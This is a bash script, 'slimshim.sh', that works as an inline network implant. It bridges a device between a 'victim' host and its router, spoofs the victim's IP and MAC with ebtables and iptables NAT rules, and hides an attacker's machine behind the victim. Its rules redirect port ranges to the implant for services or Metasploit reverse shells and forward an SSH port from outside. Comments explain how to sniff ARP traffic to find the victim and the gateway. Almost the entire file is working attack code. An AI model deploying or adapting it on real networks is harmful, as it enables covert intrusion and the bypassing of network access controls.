#!/bin/bash
# 20160703 Kirby

################################################################################
# LICENSE
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
################################################################################


################################################################################
# Usage: slimshim.sh <ip> <mac> <routerip> <routermac> | undo | prep
#  
# Do not run this script until you read everything and understand it.
#  
# Run some sniffs on the internal interface to find the IP/MAC of your victim you want to spoof and run slimshim.sh <spoofIP> <spoofMAC>.  Then find the default gateway by restarting the inside interface and sniffing for arps.  The first arp is usually the default gateway.  Also add a route for the LAN to go out the bridge interface.
# 
# 
# This script will spoof the IP and MAC of a device attached to either interface.
# If you do not have eth0/eth1, modify this script for the outside/inside interfaces you have.
# This script will carve out ports $dynports to be used as source ports for your slimshim host.
# It will also carve out ports $rdrports to redirect to your slimshim host, for any services or reverse bind shells (e.g. Metasploit).
# It will also forward those ports for destination 1.1.1.1 so that you can connect to your slimshim host from the victim device.
# 
# Run this script as 'slimshim.sh prep' to create the bridge so that the victim can connect outbound.
# Run this script as 'slimshim.sh undo' to remove the shim.
# 
# To discover the default gateway, look for arp requests from your victim.
# Here is an example on how to do so:
# ifconfig eth1 down; ifconfig eth1 up; tcpdump -c 10 -e -nni eth1 arp
# Usually, the first arp request after the interface returns will be to find the mac of the default gateway.

################################################################################
################################################################################
################################################################################
# VARIABLES
#
myip='169.254.0.1'
mymac='0:1:1:1:1:1'
sip=$1
smac=$2
rip=$3
rmac=$4
wifidev='wlan0'
wifinet='169.254.1.0/24'

# rdrports must overlap with dynports.  Dynports are for source ports on egress connections.  Rdrports will be redirected to $myip.
dynports='27000-32000'
rdrports='25000:32000'
# $dynports needs '-' and $rdrports needs ':'.   Blame it on netfilter.

# ssh redirect from outside.  Leave blank to not redirect.  This needs to be outside the range of rdrports.
sshrdr=2501

# Write variables to env file
mydate=$(date +%Y%M%d-%H%M%S)
envfile="/root/slimshim.env-$mydate"
rm -f $envfile 2>/dev/null
echo "myip=$myip" >> $envfile
echo "mymac=$mymac" >> $envfile
echo "sip=$sip" >> $envfile
echo "smac=$smac" >> $envfile
echo "rip=$rip" >> $envfile
echo "rmac=$rmac" >> $envfile
echo "wifidev=$wifidev" >> $envfile
echo "wifinet=$wifinet" >> $envfile
echo "dynports=$dynports" >> $envfile
echo "rdrports=$rdrports" >> $envfile
echo "sshrdr=$sshrdr" >> $envfile

#
################################################################################
################################################################################
################################################################################

################################################################################
function clearall() {
	ebtables -t filter -F >/dev/null 2>&1
	iptables -t filter -F >/dev/null 2>&1
	ebtables -t nat -F >/dev/null 2>&1
	iptables -t nat -F >/dev/null 2>&1
	ebtables -t mangle -F >/dev/null 2>&1
	iptables -t mangle -F >/dev/null 2>&1
	ebtables -t raw -F >/dev/null 2>&1
	iptables -t raw -F >/dev/null 2>&1
}

################################################################################
function runprep() {
    local gotofail=0
    which ip iptables ebtables modprobe brctl route ifconfig sysctl >/dev/null 2>&1 
    if [ $? != 0 ]; then
        echo "FATAL ERROR: you are missing one or more commands"
        echo "Make sure the following commands are in your path:"
        echo "ip iptables ebtables modprobe brctl route ifconfig sysctl"
        exit 1
    fi
	modprobe arptable_filter >/dev/null 2>&1
	modprobe br_netfilter >/dev/null 2>&1

    # ADJUST FOR THE INTERFACES YOU HAVE
    # NEXX devices only have eth0.1 and eth0.2
    # WARNING: OpenWRT/LEDE devices will fail if you haven't configured the interfaces to tag with the cpu interface
    grep -q 'Nexx WT3020' /proc/cpuinfo
    if [ $? == 0 ]; then
        local int1=eth0.1
        local int2=eth0.2
    else
        local int1=eth0
        local int2=eth1
    fi
	brctl show br-lan 2>&1 |grep -q "No such device" 
	if [ $? == 0 ]; then
		brctl addbr br-lan
		brctl addif br-lan $int1
		brctl addif br-lan $int2
		ifconfig br-lan up || gotofail=1
	fi
	ifconfig br-lan $myip netmask 255.255.255.0 || gotofail=1
	ip link set dev br-lan address $mymac || gotofail=1
	route add default dev br-lan >/dev/null 2>&1
	sysctl -w net.bridge.bridge-nf-call-arptables=1 >/dev/null 2>&1 || gotofail=1
	sysctl -w net.bridge.bridge-nf-call-ip6tables=1 >/dev/null 2>&1 || gotofail=1
	sysctl -w net.bridge.bridge-nf-call-iptables=1 >/dev/null 2>&1 || gotofail=1

    if [ $gotofail == 1 ]; then
        echo "FATAL ERROR: runprep function failed"
        exit 1
    fi
}

################################################################################
################################################################################
################################################################################
# MAIN
#
if [ x$1 == 'xprep' ]; then
	clearall
	runprep
	exit 0
fi
if [ x$1 == 'xundo' ]; then
	clearall
	exit 0
fi
if [ x$2 == 'x' ]; then
	echo "Usage: $0 <ip> <mac> <routerip> <routermac> | prep | undo"
	exit 1
fi

# just to make sure we're ready
runprep

# slimshim going out
ebtables -t nat -A POSTROUTING -s $mymac ! -d $smac -j snat --to-source $smac
iptables -t nat -A POSTROUTING -p tcp -s $myip ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $myip ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p icmp -s $myip ! -d $sip -j SNAT --to $sip
iptables -t nat -A POSTROUTING -p tcp -s $wifinet ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $wifinet ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p icmp -s $wifinet ! -d $sip -j SNAT --to $sip

# slimshim going to victim
ebtables -t nat -A POSTROUTING -s $mymac -d $smac -j snat --to-source $rmac
iptables -t nat -A POSTROUTING -p tcp -s $myip -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $myip -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p icmp -s $myip -d $sip -j SNAT --to $rip
iptables -t nat -A POSTROUTING -p tcp -s $wifinet -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $wifinet -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p icmp -s $wifinet -d $sip -j SNAT --to $rip

# outside to victim
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto tcp --ip-destination $sip --ip-destination-port=$rdrports -j dnat --to-destination $mymac
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto udp --ip-destination $sip --ip-destination-port=$rdrports -j dnat --to-destination $mymac
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto tcp --ip-destination 1.1.1.1 -j dnat --to-destination $mymac
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto udp --ip-destination 1.1.1.1 -j dnat --to-destination $mymac
iptables -t nat -A PREROUTING ! -s $myip -d $sip -p tcp -m tcp -m multiport --dports $rdrports -j DNAT --to-destination $myip
iptables -t nat -A PREROUTING ! -s $myip -d $sip -p udp -m udp -m multiport --dports $rdrports -j DNAT --to-destination $myip

# victim going to slimshim
iptables -t nat -A PREROUTING -d 1.1.1.1 -p tcp -j DNAT --to-destination $myip
iptables -t nat -A PREROUTING -d 1.1.1.1 -p udp -j DNAT --to-destination $myip

if [ x$sshrdr != 'x' ];then
	ebtables -t nat -A PREROUTING -p 0x800 --ip-proto tcp --ip-destination $sip --ip-destination-port=$sshrdr -j dnat --to-destination $mymac
	iptables -t nat -A PREROUTING -d $sip -p tcp -m tcp --dport $sshrdr -j DNAT --to-destination $myip:22
fi


################################################################################
################################################################################
# Now you need to find the default router and set your default gateway
# You may want to nmap scan $sip for $rdrports to make sure you are not blocking anything.
# You also need to add a route for the lan you are on to avoid the default gateway
# Example: route add -net 192.168.1.0/24 dev br-lan
# Example: route add default gw 192.168.1.1
# Also, update /etc/resolv.conf
# 
# If you used the slimrun script, then this should have been automatic


